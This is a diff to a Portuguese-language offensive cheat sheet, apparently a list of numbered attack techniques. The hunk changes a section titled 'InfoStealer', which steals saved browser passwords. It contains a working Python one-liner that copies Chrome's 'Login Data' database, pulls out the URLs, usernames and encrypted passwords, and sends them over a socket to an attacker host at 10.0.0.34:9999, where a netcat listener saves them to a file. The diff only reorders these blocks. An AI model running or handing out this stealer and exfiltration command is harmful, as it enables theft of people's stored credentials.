@@ -252,11 +252,13 @@ powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using S
 ```
 
 ### 6. InfoStealer - Roubar senhas do Navegador
+### No shell do atacante
+``` cmd
+nc -lvnp 9999 > chrome_passwords.txt
+```
+
 ```cmd
 # No shell da vitima windows:
 python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
-
-# No shell do atacante
-nc -lvnp 9999 > chrome_passwords.txt
 ```
----
+
